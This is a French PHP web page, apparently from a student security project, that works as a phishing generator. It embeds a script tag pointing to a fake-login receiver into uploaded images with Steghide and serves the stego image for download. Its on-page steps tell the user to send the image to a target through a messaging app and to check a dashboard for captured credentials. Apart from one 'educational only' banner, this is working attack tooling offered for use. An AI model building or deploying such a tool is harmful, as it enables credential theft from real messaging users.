<?php
// Page de stéganographie complète
// Upload image → Cachez le script → Téléchargez l'image stéganographiée

session_start();
include '../traitements/db.php';

// Vérifier que l'utilisateur est connecté
if (!isset($_SESSION["user_id"])) {
    header("Location: ../login.php");
    exit();
}

$user_id = $_SESSION["user_id"];
$username = $_SESSION["username"] ?? "Utilisateur";

// Dossier pour les images stéganographiées
$upload_dir = __DIR__ . '/../uploads/images/';
if (!is_dir($upload_dir)) {
    mkdir($upload_dir, 0755, true);
}
chmod($upload_dir, 0755);

$message = '';
$message_type = '';
$stego_image = '';

// Traiter l'upload
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['image'])) {
    $file = $_FILES['image'];
    
    // Validation première vérification
    $allowed = ['image/jpeg', 'image/png', 'image/bmp', 'image/x-ms-bmp', 'image/x-bmp'];
    if (!in_array($file['type'], $allowed)) {
        $message = "Format non autorisé. Utilisez JPG, PNG ou BMP.";
        $message_type = 'error';
    } elseif ($file['size'] > 5 * 1024 * 1024) { // 5MB max
        $message = "L'image est trop volumieuse (max 5MB).";
        $message_type = 'error';
    } else {
        try {
            // Vérifier que le dossier est accessible en écriture
            if (!is_writable($upload_dir)) {
                throw new Exception("Le dossier de destination n'est pas accessible en écriture. Permissions refusées.");
            }
            
            // Sauvegarder l'image temporaire
            $temp_filename = 'temp_' . time() . '_' . basename($file['name']);
            $temp_path = $upload_dir . $temp_filename;
            
            if (!move_uploaded_file($file['tmp_name'], $temp_path)) {
                throw new Exception("Impossible de télécharger le fichier. Vérifiez les permissions du dossier.");
            }
            
            // Vérifier le type MIME réel du fichier (pas juste l'extension)
            $finfo = finfo_open(FILEINFO_MIME_TYPE);
            $real_mime = finfo_file($finfo, $temp_path);
            finfo_close($finfo);
            
            $valid_mimes = ['image/jpeg', 'image/png', 'image/bmp', 'image/x-ms-bmp', 'image/x-bmp'];
            if (!in_array($real_mime, $valid_mimes)) {
                if (file_exists($temp_path)) {
                    unlink($temp_path);
                }
                throw new Exception("Le fichier n'est pas une image valide. Type détecté: " . htmlspecialchars($real_mime) . ". Utilisez un vrai fichier JPG, PNG ou BMP.");
            }
            
            // Vérifier les dimensions de l'image (au minimum 100x100 pour Steghide)
            $image_info = @getimagesize($temp_path);
            if ($image_info === false) {
                if (file_exists($temp_path)) {
                    unlink($temp_path);
                }
                throw new Exception("Impossible de lire l'image. Le fichier peut être corrompu.");
            }
            
            $width = $image_info[0];
            $height = $image_info[1];
            
            if ($width < 100 || $height < 100) {
                if (file_exists($temp_path)) {
                    unlink($temp_path);
                }
                throw new Exception("L'image est trop petite pour la stéganographie. Dimensions: {$width}x{$height}. Minimum requis: 100x100 pixels. Utilisez une image plus grande.");
            }
            
            // Générer le payload (script de phishing)
            $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
            $host = $_SERVER['HTTP_HOST'];
            $baseUrl = $protocol . "://" . $host . "/projects/MDI/cyber-securite/messagerie";
            
            $payload = '<script src="' . $baseUrl . '/codes/fake_login/receiver.php?sender=' . $user_id . '"></script>';
            
            // Créer un fichier temporaire avec le payload
            $payload_file = $upload_dir . 'payload_' . time() . '.txt';
            if (file_put_contents($payload_file, $payload) === false) {
                throw new Exception("Impossible d'écrire le fichier payload.");
            }
            
            // Vérifier la taille du payload vs l'image (Steghide peut avoir des problèmes si le payload est trop gros)
            $image_size = filesize($temp_path);
            $payload_size = filesize($payload_file);
            
            // Steghide peut stocker environ 1 byte par 10-16 bytes d'image (être permissif)
            $min_image_size_for_payload = $payload_size * 10; // Ratio 1:10
            
            if ($image_size < $min_image_size_for_payload) {
                if (file_exists($payload_file)) {
                    unlink($payload_file);
                }
                if (file_exists($temp_path)) {
                    unlink($temp_path);
                }
                $required_size = $min_image_size_for_payload;
                $required_kb = round($required_size / 1024, 1);
                $current_kb = round($image_size / 1024, 1);
                throw new Exception("❌ L'image est trop petite!\n\nTaille actuelle: {$current_kb}KB\nTaille minimale requise: {$required_kb}KB\nPayload: {$payload_size}B\n\nSolution: Utilisez une image plus grande (au moins 1920x1280 ou 200KB+)");
            }
            
            // Utiliser Steghide pour cacher le payload
            $output_filename = 'stego_' . time() . '_' . basename($file['name']);
            $output_path = $upload_dir . $output_filename;
            
            // Commande Steghide - Réinitialiser LD_LIBRARY_PATH pour éviter les bibliothèques XAMPP
            // (XAMPP a des versions anciennes de libstdc++.so.6 qui causent des problèmes)
            $cmd = "LD_LIBRARY_PATH=/usr/lib/x86_64-linux-gnu:/usr/lib:/lib/x86_64-linux-gnu:/lib /usr/bin/steghide embed -cf " . escapeshellarg($temp_path) . " -ef " . escapeshellarg($payload_file) . " -sf " . escapeshellarg($output_path) . " -p '' -f 2>&1";
            
            $output = [];
            $return_var = 0;
            exec($cmd, $output, $return_var);
            
            // Nettoyer les fichiers temporaires
            if (file_exists($temp_path)) {
                unlink($temp_path);
            }
            if (file_exists($payload_file)) {
                unlink($payload_file);
            }
            
            if ($return_var !== 0) {
                $error_msg = implode("\n", $output);
                // Nettoyer aussi le fichier de sortie en cas d'erreur
                if (file_exists($output_path)) {
                    unlink($output_path);
                }
                throw new Exception("Erreur Steghide: " . $error_msg);
            }
            
            if (!file_exists($output_path)) {
                throw new Exception("L'image stéganographiée n'a pas été créée. Vérifiez que Steghide est installé.");
            }
            
            $stego_image = $output_filename;
            $message = "✓ Image stéganographiée créée avec succès!";
            $message_type = 'success';
            
        } catch (Exception $e) {
            $message = "❌ " . $e->getMessage();
            $message_type = 'error';
            if (isset($temp_path) && file_exists($temp_path)) {
                unlink($temp_path);
            }
            if (isset($payload_file) && file_exists($payload_file)) {
                unlink($payload_file);
            }
            if (isset($output_path) && file_exists($output_path)) {
                unlink($output_path);
            }
        }
    }
}

// Télécharger l'image
if (isset($_GET['download'])) {
    $filename = basename($_GET['download']);
    $filepath = $upload_dir . $filename;
    
    // Vérifier que le fichier existe et appartient à l'utilisateur
    if (strpos($filename, 'stego_') === 0 && file_exists($filepath)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . $filename . '"');
        header('Content-Length: ' . filesize($filepath));
        readfile($filepath);
        exit();
    }
}

?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Générateur de Phishing - Stéganographie</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        
        .header {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            background: linear-gradient(135deg, #31a24c 0%, #4db366 100%);
            color: white;
            padding: 15px 20px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
            z-index: 1000;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .header h2 {
            font-size: 1.3rem;
        }
        
        .header-user {
            display: flex;
            gap: 15px;
            align-items: center;
        }
        
        .header-user a {
            color: white;
            text-decoration: none;
            padding: 8px 15px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 5px;
            transition: background 0.2s;
        }
        
        .header-user a:hover {
            background: rgba(255, 255, 255, 0.3);
        }
        
        .container {
            max-width: 900px;
            margin: 80px auto 20px;
        }
        
        .card {
            background: white;
            border-radius: 10px;
            padding: 30px;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.15);
            margin-bottom: 20px;
        }
        
        .card h1 {
            color: #667eea;
            margin-bottom: 10px;
            font-size: 24px;
        }
        
        .card-subtitle {
            color: #666;
            font-size: 14px;
            margin-bottom: 30px;
        }
        
        .upload-section {
            border: 2px dashed #667eea;
            border-radius: 10px;
            padding: 40px;
            text-align: center;
            background: #f9f9f9;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .upload-section:hover {
            background: #f0f0ff;
            border-color: #764ba2;
        }
        
        .upload-section.dragging {
            background: #e8f0ff;
            border-color: #764ba2;
        }
        
        .upload-section input {
            display: none;
        }
        
        .upload-icon {
            font-size: 48px;
            margin-bottom: 15px;
        }
        
        .upload-text {
            color: #333;
            font-size: 16px;
            font-weight: bold;
            margin-bottom: 5px;
        }
        
        .upload-hint {
            color: #999;
            font-size: 13px;
        }
        
        .message {
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            font-size: 14px;
        }
        
        .message.success {
            background: #d4edda;
            border: 1px solid #c3e6cb;
            color: #155724;
        }
        
        .message.error {
            background: #f8d7da;
            border: 1px solid #f5c6cb;
            color: #721c24;
        }
        
        .button {
            background: #667eea;
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px;
            font-weight: bold;
            transition: background 0.3s;
        }
        
        .button:hover {
            background: #764ba2;
        }
        
        .button:disabled {
            background: #ccc;
            cursor: not-allowed;
        }
        
        .button.secondary {
            background: #95a5a6;
        }
        
        .button.secondary:hover {
            background: #7f8c8d;
        }
        
        .button.download {
            background: #27ae60;
        }
        
        .button.download:hover {
            background: #229954;
        }
        
        .result-section {
            background: #f9f9f9;
            border: 1px solid #eee;
            border-radius: 10px;
            padding: 20px;
            margin-top: 20px;
            text-align: center;
        }
        
        .result-image {
            max-width: 200px;
            max-height: 200px;
            margin: 20px auto;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
        }
        
        .result-buttons {
            display: flex;
            gap: 10px;
            justify-content: center;
            margin-top: 15px;
            flex-wrap: wrap;
        }
        
        .info-box {
            background: #e8f4f8;
            border-left: 4px solid #667eea;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            color: #2c5aa0;
            font-size: 13px;
            line-height: 1.5;
        }
        
        .warning-box {
            background: #fff3cd;
            border-left: 4px solid #ffc107;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            color: #856404;
            font-size: 13px;
        }
        
        .flow {
            display: flex;
            align-items: center;
            justify-content: space-around;
            margin: 30px 0;
            flex-wrap: wrap;
            gap: 20px;
        }
        
        .flow-step {
            text-align: center;
            flex: 1;
            min-width: 150px;
        }
        
        .flow-icon {
            font-size: 32px;
            margin-bottom: 10px;
        }
        
        .flow-text {
            color: #666;
            font-size: 13px;
        }
        
        .flow-arrow {
            color: #667eea;
            font-size: 24px;
        }
        
        .image-preview {
            text-align: center;
            margin: 20px 0;
        }
        
        .image-preview img {
            max-width: 300px;
            max-height: 300px;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
        }
        
        .filename {
            color: #666;
            font-size: 12px;
            margin-top: 10px;
            word-break: break-all;
        }
        
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="header">
        <div>
            <h2>🎯 Générateur de Phishing par Stéganographie</h2>
        </div>
        <div class="header-user">
            <span><?php echo htmlspecialchars($username); ?></span>
            <a href="../traitements/logout.php">Se déconnecter</a>
        </div>
    </div>
    
    <div class="container">
        <!-- Info Box -->
        <div class="card">
            <div class="info-box">
                <strong>ℹ️ Comment ça fonctionne:</strong>
                <ol style="margin-left: 15px; margin-top: 10px;">
                    <li>Uploadez une image (JPG, PNG ou BMP)</li>
                    <li>Cliquez "Générer" pour cacher le script</li>
                    <li>Téléchargez l'image stéganographiée</li>
                    <li>Envoyez-la à votre cible via la messagerie</li>
                    <li>Quand elle ouvre l'image, le phishing s'active!</li>
                </ol>
            </div>
        </div>
        
        <!-- Warning -->
        <div class="card">
            <div class="warning-box">
                <strong>⚠️ Avertissement:</strong> Démonstration éducative uniquement. 
                N'utilisez PAS contre des personnes réelles.
            </div>
        </div>
        
        <!-- Main Form -->
        <div class="card">
            <h1>📸 Stéganographie</h1>
            <p class="card-subtitle">Cachez le script de phishing dans une image</p>
            
            <?php if ($message): ?>
                <div class="message <?php echo $message_type; ?>">
                    <?php echo nl2br(htmlspecialchars($message)); ?>
                </div>
            <?php endif; ?>
            
            <form method="POST" enctype="multipart/form-data">
                <div class="upload-section" id="uploadArea">
                    <input type="file" id="imageInput" name="image" accept="image/*" required>
                    <div class="upload-icon">📁</div>
                    <div class="upload-text">Cliquez ou glissez votre image ici</div>
                    <div class="upload-hint">JPG, PNG ou BMP • Maximum 5MB</div>
                </div>
                
                <div id="imagePreview" class="hidden image-preview">
                    <img id="previewImg" src="" alt="">
                    <div class="filename" id="previewName"></div>
                </div>
                
                <div style="margin-top: 20px; text-align: center;">
                    <button type="submit" class="button" style="padding: 15px 40px; font-size: 16px;">
                        🔐 Générer l'Image Stéganographiée
                    </button>
                </div>
            </form>
            
            <div style="margin-top: 15px; padding: 10px; background: #f0f0f0; border-radius: 5px; text-align: center;">
                <a href="debug_steghide.php" style="color: #667eea; text-decoration: none;">
                    🔧 Problème? Utilisez le diagnostic complet
                </a>
            </div>
            
            <!-- Résultat -->
            <?php if ($stego_image): ?>
                <div class="result-section">
                    <div style="font-size: 24px; margin-bottom: 10px;">✓</div>
                    <h3 style="color: #27ae60; margin-bottom: 5px;">Image stéganographiée créée!</h3>
                    <p style="color: #666; font-size: 13px; margin-bottom: 20px;">
                        Le script de phishing est maintenant caché dans votre image.
                    </p>
                    
                    <div class="result-buttons">
                        <a href="?download=<?php echo urlencode($stego_image); ?>" class="button download">
                            📥 Télécharger l'image
                        </a>
                        <a href="steganography.php" class="button secondary">
                            ↻ Nouvelle image
                        </a>
                        <a href="../../conversation.php" class="button secondary">
                            💬 Aller à la messagerie
                        </a>
                    </div>
                    
                    <div style="margin-top: 20px; padding: 15px; background: white; border-radius: 5px; border-left: 3px solid #27ae60;">
                        <strong style="color: #27ae60;">Prochaine étape:</strong>
                        <p style="font-size: 12px; color: #666; margin-top: 8px;">
                            1. Téléchargez l'image<br>
                            2. Allez à votre messagerie<br>
                            3. Envoyez l'image à votre cible<br>
                            4. Consultez votre dashboard pour voir les captures
                        </p>
                    </div>
                </div>
            <?php endif; ?>
        </div>
        
        <!-- Flow Diagram -->
        <div class="card">
            <h3 style="color: #667eea; margin-bottom: 20px;">Flux d'attaque</h3>
            <div class="flow">
                <div class="flow-step">
                    <div class="flow-icon">📸</div>
                    <div class="flow-text">Upload image</div>
                </div>
                <div class="flow-arrow">→</div>
                <div class="flow-step">
                    <div class="flow-icon">🔐</div>
                    <div class="flow-text">Stéganographie</div>
                </div>
                <div class="flow-arrow">→</div>
                <div class="flow-step">
                    <div class="flow-icon">📥</div>
                    <div class="flow-text">Téléchargement</div>
                </div>
                <div class="flow-arrow">→</div>
                <div class="flow-step">
                    <div class="flow-icon">💬</div>
                    <div class="flow-text">Envoyer via messagerie</div>
                </div>
                <div class="flow-arrow">→</div>
                <div class="flow-step">
                    <div class="flow-icon">🎯</div>
                    <div class="flow-text">Phishing activé!</div>
                </div>
            </div>
        </div>
        
        <!-- Quick Links -->
        <div class="card">
            <h3 style="color: #667eea; margin-bottom: 15px;">Accès Rapide</h3>
            <div style="display: flex; gap: 10px; flex-wrap: wrap;">
                <a href="dashboard.php" class="button secondary">📊 Mon Dashboard</a>
                <a href="../../conversation.php" class="button secondary">💬 Messagerie</a>
                <a href="../../inbox.php" class="button secondary">📧 Boîte de réception</a>
            </div>
        </div>
    </div>
    
    <script>
        const uploadArea = document.getElementById('uploadArea');
        const imageInput = document.getElementById('imageInput');
        const imagePreview = document.getElementById('imagePreview');
        const previewImg = document.getElementById('previewImg');
        const previewName = document.getElementById('previewName');
        
        // Click to upload
        uploadArea.addEventListener('click', () => imageInput.click());
        
        // Drag and drop
        uploadArea.addEventListener('dragover', (e) => {
            e.preventDefault();
            uploadArea.classList.add('dragging');
        });
        
        uploadArea.addEventListener('dragleave', () => {
            uploadArea.classList.remove('dragging');
        });
        
        uploadArea.addEventListener('drop', (e) => {
            e.preventDefault();
            uploadArea.classList.remove('dragging');
            imageInput.files = e.dataTransfer.files;
            handleImageSelect();
        });
        
        // File selection
        imageInput.addEventListener('change', handleImageSelect);
        
        function handleImageSelect() {
            const file = imageInput.files[0];
            if (file) {
                const reader = new FileReader();
                reader.onload = (e) => {
                    previewImg.src = e.target.result;
                    previewName.textContent = file.name + ' (' + (file.size / 1024).toFixed(2) + ' KB)';
                    imagePreview.classList.remove('hidden');
                };
                reader.readAsDataURL(file);
            }
        }
    </script>
</body>
</html>
